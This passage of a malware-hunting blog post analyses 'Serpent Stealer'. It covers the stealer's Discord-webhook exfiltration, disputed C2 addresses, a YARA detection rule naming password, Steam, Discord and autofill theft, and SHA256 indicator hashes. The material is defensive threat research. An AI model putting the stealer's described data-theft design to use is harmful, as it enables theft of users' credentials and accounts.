</pre></table></code></div></div><p>Additionally, it operates independently of a traditional C2 or server infrastructure, being controlled instead by a Discord bot.</p><p>In our extensive hunt, we also identified a version of ‘Serpent Stealer’ labeled as C++. However, instead of being developed from scratch in C++, it simply involves calling a .NET DLL from C++. The efficacy of our Yara rule extends to both the .NET and C++ versions, hence further analysis of this variant is not deemed necessary.</p><h1 id="part-3---c2-panel">Part 3 - C2 Panel</h1><p>In this section of our article, Part 3 - C2 Panel, we address claims about C2 Panels associated with <code class="language-plaintext highlighter-rouge">SerpentStealer</code> found online. This inclusion is essential for a comprehensive analysis.</p><p><img data-src="/assets/img/serpent/14.png" alt="Untitled" data-proofer-ignore></p><p>Interestingly, all the samples we’ve analyzed, identified as Serpent Stealer, showed no signs of interacting with any C2 server. There was a clear absence of any links between the Serpent.dll samples and the C2 server IP addresses mentioned online. Reinforcing this observation, the developer noted in their Breach Forums post that ‘Serpent Stealer uses Discord Webhook to exfiltrate data, no c2 / server required.’ The developer’s precise wording was ‘Outputs Logs to Discord Webhook (No C2/Server Required).</p><p><img data-src="/assets/img/serpent/15.png" alt="Untitled" data-proofer-ignore></p><p>Further investigations reveal that another tool developed by the same creator, known as <code class="language-plaintext highlighter-rouge">Cobra (Serpent RAT)</code>, also utilizes Discord webhooks instead of a traditional C2 server. This consistent pattern suggests with high confidence that this particular threat actor generally opts for Discord webhooks over C2 servers. This observation leads us to question the authenticity of C2 addresses linked to ‘Serpent Stealer’ in various online sources, such as the ones mentioned in a specific tweet. It seems increasingly likely that these C2 addresses might not actually be associated with ‘Serpent Stealer’.</p><h1 id="part-4---yara-rule--iocs">Part 4 - Yara Rule / IOCs</h1><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">rule</span> <span class="nc">SerpentStealer</span> <span class="p">{</span>
	<span class="n">meta</span><span class="o">:</span>
		<span class="n">author</span> <span class="o">=</span> <span class="s2">"tufan - @tufan_gngr"</span>
		<span class="n">description</span> <span class="o">=</span> <span class="s2">"Detects .NET based malware named Serpent Stealer"</span>
		<span class="n">date</span> <span class="o">=</span> <span class="s2">"2024-01-07"</span>
		<span class="n">references</span> <span class="o">=</span> <span class="s2">"https://tufan-gungor.github.io/"</span>
	<span class="n">strings</span><span class="o">:</span>
		<span class="nv">$s1</span> <span class="o">=</span> <span class="s2">"serpent"</span> <span class="n">nocase</span>
		<span class="nv">$s2</span> <span class="o">=</span> <span class="s2">"steamclient"</span> <span class="n">nocase</span>
		<span class="nv">$s3</span> <span class="o">=</span> <span class="s2">"steamapikey"</span> <span class="n">nocase</span>
		<span class="nv">$s4</span> <span class="o">=</span> <span class="s2">"discordstealer"</span> <span class="n">nocase</span>
		<span class="nv">$s5</span> <span class="o">=</span> <span class="s2">"historystealer"</span> <span class="n">nocase</span>
		<span class="nv">$s6</span> <span class="o">=</span> <span class="s2">"Users</span><span class="se">\\</span><span class="s2">Aperx"</span> <span class="n">nocase</span>
		<span class="nv">$s7</span> <span class="o">=</span> <span class="s2">"passwordstealer"</span> <span class="n">nocase</span>
		<span class="nv">$s8</span> <span class="o">=</span> <span class="s2">"bookmarkstealer"</span> <span class="n">nocase</span>
		<span class="nv">$s9</span> <span class="o">=</span> <span class="s2">"autofillstealer"</span> <span class="n">nocase</span>
	<span class="n">condition</span><span class="o">:</span>
		<span class="nf">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5A4D</span> <span class="k">and</span> 
		<span class="nf">uint32</span><span class="p">(</span><span class="nf">uint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">))</span> <span class="o">==</span> <span class="mh">0x00004550</span> <span class="k">and</span>
		<span class="mi">5</span> <span class="n">of</span> <span class="n">them</span>
<span class="p">}</span>

</pre></table></code></div></div><p>After implementing our custom Yara rule for detecting ‘Serpent Stealer’ in a Retrohunt on VirusTotal, the search yielded 38 instances of the malware. Subsequently, I compiled SHA256 IOCs of the ‘Serpent Stealer’ from Github contributions by fellow researchers and re-ran my Yara rule against this consolidated list. Impressively, there was a match for <code class="language-plaintext highlighter-rouge">38 out of the 44</code> hashes.</p><p>Upon closer examination, we discovered why our match rate wasn’t a complete 44/44. It turns out that 6 hashes, initially thought to be linked to ‘Serpent Stealer’ and shared by other researchers, actually belonged to <code class="language-plaintext highlighter-rouge">Exela Stealer</code>. By removing these erroneous hashes from our analysis, we achieved a flawless match of 38/38.</p><p><strong><em>Exela Stealer</em></strong></p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>1a4205058e912576a1de66af027cf53f32d862102108d556968647913cb778ce
35fbbfeae68bcae26ad9bccc3b983862d27f2053b2706b4aa33d11acf9ab3aca
6c14f5983ad0e4c9a31fcf3184332d9e4303f085bf866057f914990ea825fa52
789a9e3d6cf07d241935638670c2177e261f395107de0a7aea9e2882363a9083
7ac6012327bf433286be5e98d8c69633e73e64b017a886f63dafab7d6f68ff9f
a753967096145e7e8b0a3d2d4e952ae67f1c9a9974242fa3302287812de0f0ed

</pre></table></code></div></div><p><strong><em>Serpent Stealer</em></strong></p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>00b09f9e47986fcff9506c379e27b2361e40e46fc49c3c4d60c4a8402c857f62
0edc6f2868e4759f541732d1e7ed6ee648736612bf5bf24f737971a65a558110
212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed
23fdc2c625766231b05a4d49e3435196cadb69154d29dc509a3e5f26393e1a54
24db3ebba8ef08d3ec207e45db936f6064bc41dde32ea97b9eb48fa6f20da948
25c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce
2a71d550b7f2be38fa120f3fa0726ce370d2983231d3ab823d99f5d50ce79ca4
2f38a024861649bbfcea0c53869dc3036a4ddcc7a7a07011e21f17c5ab67abd6
31634c953506e3a1da501044c5aba27aa3074fb70a0d1c16f89c706a89d0ab51
349d4ba8bfc898896d925ddfb43095fa6e486138eb06191fe0ddf9b026513862
37c7607ee4ae0741f6e38b7ddd55392d41cdcfc238203dfea24ac87611db8396
3aa2b8af0f25d926d8a02042e0cf71d6cabb781e00295702541b39fe2a630f9b
3c620ede8d0f92f39e80f03cbf84967881789bbb2748cea3e0c51fa552b68371
4b58cb217a8b42378128d88e873e3eb611f1e0c3f51ba060a0130fe522453e2c
4b9e172aec228e7d562461f88fa6c6d176e223726de2c67f3464a432251734e2
4c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c41
4d5431b80340043b87699c7f245005e55b4de70ff97df548dd9cb3b8902773e9
59f96183a0c0365d42eeecca53941dfb128449ea93edb2fe6b0ae7a7e36fecda
5bafa1993e90a3cdf7dca373fddfa8255d75621ba276299ef119d68f1bc6e85e
5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d
6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d
6c237036ebd8275d41def2f8be0fec4e7754f180b0b98f30461396753bd3d262
7670c776c8f07236af6d94adf14de1216140c16fa8db44135660c239313fac93
908a1af19e0a77317619ca05e7f03f3256ec8f5959a9bb29c31b428547b14f9c
979f1c5212a2408dbc8fae1088198e7631a992d306a4178fa1cb0117f936534c
9ef28fd1f7eb7a71aae2a3e9d4ff1327a7d5a60a74b18cbb8aae1d31473878b9
a9175b2800be17be05d141ad2f7bf2faeef24bd10a455a9478b0d5ba082a287e
a9e9e02742cc91156c7bd3bfcac8165855c72480f42b0bc2308ceb5595a883b1
aa1f3af70210dd0886ab0f9273acc28b39c35905036b38f2840aa1a18ddaf05c
be2a557fea54a051c55d59e21f0fce4547a0c60ef9b2aa19fe65befa20efa8e5
bfafccbcfe72483ce31b6a5382053e29a555932944bed1e4e752376441e57562
c4f981f1f532ec827032775c88a45f1b4153c3d27885f189654ad6ee85c709c1
cd118e082d2c035da179358c8a3c54b879b6e1b71eec2a965b78aa929b83eb11
ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041
e60a754c658df7edef8e4785de4b3374b9d0bf3efbc553a617032729e2d0d684
e91111aa62210fbfb5e726b10a92463179408ba5741fddb89bfc16d787ade60e
f33c32d58671cbcfb1ee150627ee641908bf8ca277d6555cb10edd7787a75344
ff2b9589a477499d34853ec843824091d2e6fa1301d5ab3242931afec6845351
</pre></table></code></div></div><p><img data-src="/assets/img/serpent/16.png" alt="Untitled" data-proofer-ignore></p><p>Additionally, the retrohunt conducted with this Yara rule over the last 90 days on VirusTotal indicated a remarkable accuracy, showing no false positives in the results.</p><h1 id="references">References</h1><ul><li><a href="https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable">https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable</a><li><a href="https://twitter.com/karol_paciorek/status/1722590659532447810">https://twitter.com/karol_paciorek/status/1722590659532447810</a><li><a href="https://github.com/ThreatMon/ThreatMon-Reports-IOC/tree/main/Serpent-Stealer-Unmasked-Threat-Analysis-and-Countermeasures">https://github.com/ThreatMon/ThreatMon-Reports-IOC/tree/main/Serpent-Stealer-Unmasked-Threat-Analysis-and-Countermeasures</a><li><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.serpent">https://malpedia.caad.fkie.fraunhofer.de/details/win.serpent</a></ul><p><strong>I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision.</strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/reverse-engineering/'>Reverse Engineering</a>, <a href='/categories/malware-hunting/'>Malware Hunting</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >reverse engineering</a> <a href="/tags/malware-hunting/" class="post-tag no-text-decoration" >malware hunting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hunt and Analysis - Serpent Stealer - tufan.&amp;url=https://tufan-gungor.github.io/posts/serpent-stealer-analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hunt and Analysis - Serpent Stealer - tufan.&amp;u=https://tufan-gungor.github.io/posts/serpent-stealer-analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tufan-gungor.github.io/posts/serpent-stealer-analysis/&amp;text=Hunt and Analysis - Serpent Stealer - tufan." data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/spynote-android-malware/">Spynote Android Malware Masquerades as VPN Amid Turkey's Instagram Ban</a><li><a href="/posts/nightingale-stealer-analysis/">Hunt and Analysis - Nightingale Stealer</a><li><a href="/posts/hornet-stealer-analysis/">Hunt and Analysis - Hornet Stealer</a><li><a href="/posts/sentinel-stealer-analysis/">Hunt and Analysis - Sentinel Stealer</a><li><a href="/posts/neptune-loader-analysis/">Hunt and Analysis - Neptune Loader</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/reverse-engineering/">reverse engineering</a> <a class="post-tag" href="/tags/malware-hunting/">malware hunting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/neptune-loader-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1705161600" > 2024-01-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hunt and Analysis - Neptune Loader</h3><div class="text-muted small"><p> Part 1 - Neptune || A Native HTTP Loader A user named m0hx shared a post on hackforums.net on November 22, 2023, promoting a loader called Neptune. In the threat actor’s exact words; “Neptune is ...</p></div></div></a></div><div class="card"> <a href="/posts/sentinel-stealer-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1705766400" > 2024-01-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hunt and Analysis - Sentinel Stealer</h3><div class="text-muted small"><p> Part 1 - Sentinel Stealer || Stealer as a Service On January 19th, the Twitter account @FalconFeedsio reported the discovery of a new stealer, known as Sentinel Stealer. Although there were earlie...</p></div></div></a></div><div class="card"> <a href="/posts/hornet-stealer-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1706544000" > 2024-01-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hunt and Analysis - Hornet Stealer</h3><div class="text-muted small"><p> Part 1 - Hornet Stealer On January 24th, the Twitter account @spamhaus posted a tweet regarding a newly discovered C2 panel. Based on the panel’s logo and name, they have identified this malwar...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/x86-calling-conventions/" class="btn btn-outline-primary" prompt="Older"><p>Calling Conventions for Reverse Engineering</p></a> <a href="/posts/neptune-loader-analysis/" class="btn btn-outline-primary" prompt="Newer"><p>Hunt and Analysis - Neptune Loader</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/tufan_gngr">Tufan Gungor</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/reverse-engineering/">reverse engineering</a> <a class="post-tag" href="/tags/malware-hunting/">malware hunting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QEK7ERP9FL"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QEK7ERP9FL'); }); </script>
